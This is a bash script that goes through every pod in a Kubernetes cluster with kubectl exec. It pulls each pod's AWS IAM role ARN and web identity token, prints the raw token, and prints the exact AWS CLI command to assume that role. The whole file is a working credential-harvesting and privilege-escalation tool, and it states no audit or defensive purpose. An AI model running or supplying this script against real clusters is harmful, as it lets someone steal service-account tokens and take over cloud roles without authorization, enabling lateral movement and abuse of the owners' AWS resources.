#!/usr/bin/env bash

# This script finds pods with AWS IRSA configured and prints the Role ARN,
# the web identity token, and the exact AWS CLI command to assume the role.

echo "🔎 Searching for pods with AWS web identity tokens and role ARNs..."
echo "========================================================================"

TOKEN_FOUND_COUNT=0

# Use process substitution to avoid subshell (so counter works)
while read -r ns pod; do

    # Check for the token file path. This indicates IRSA is active.
    path=$(kubectl exec -n "$ns" "$pod" -- sh -c 'echo -n "$AWS_WEB_IDENTITY_TOKEN_FILE"' 2>/dev/null)

    if [ -n "$path" ]; then
        ((TOKEN_FOUND_COUNT++))

        # Get the Role ARN and the token content from the pod.
        role_arn=$(kubectl exec -n "$ns" "$pod" -- sh -c 'echo -n "$AWS_ROLE_ARN"' 2>/dev/null)
        token_content=$(kubectl exec -n "$ns" "$pod" -- sh -c "cat \"$path\"" 2>/dev/null)

        echo "✅ Found Credentials in Namespace: $ns"
        echo "   Pod Name: $pod"
        echo "   Role ARN: $role_arn"

        echo "   Token Content:"
        echo "   ------------------------------------------------------------------"
        echo "   $token_content"
        echo "   ------------------------------------------------------------------"

        echo "   ▶️  To assume this role, run:"
        echo "   ------------------------------------------------------------------"
        echo "   aws sts assume-role-with-web-identity \\"
        echo "       --role-arn \"$role_arn\" \\"
        echo "       --role-session-name \"MySessionName\" \\"
        echo "       --web-identity-token \"$token_content\""
        echo "   ------------------------------------------------------------------"
        echo ""
    fi

done < <(
    kubectl get pods --all-namespaces \
    -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{"\n"}{end}'
)

# Final status message
if [ "$TOKEN_FOUND_COUNT" -eq 0 ]; then
    echo "🤷 No pods with the AWS_WEB_IDENTITY_TOKEN_FILE variable were found."
fi

echo "========================================================================"
echo "✨ Search complete. Found credentials in $TOKEN_FOUND_COUNT pod(s)."
